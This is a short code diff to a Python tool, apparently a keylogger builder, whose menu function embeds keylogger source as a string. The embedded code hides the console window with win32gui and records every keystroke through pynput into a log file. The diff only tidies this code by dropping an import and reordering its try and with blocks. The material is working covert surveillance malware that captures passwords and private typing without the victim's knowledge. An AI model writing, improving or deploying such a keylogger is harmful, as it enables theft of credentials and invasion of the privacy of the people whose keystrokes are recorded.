@@ -15,17 +15,15 @@ def menu_principal():
             codigo = '''from pynput import keyboard
 import win32console
 import win32gui
-import keylogger
-            
+
 ventana = win32console.GetConsoleWindow()
 win32gui.ShowWindow(ventana, 0)
 
 def on_press(key):
-    try:
-        with open("log.txt", "a") as f:
+    with open("log.txt", "a") as f:
+        try:
             f.write(key.char)
-    except AttributeError:
-        with open("log.txt", "a") as f:
+        except AttributeError:
             f.write(f" {key} ")
 
 def on_release(key):
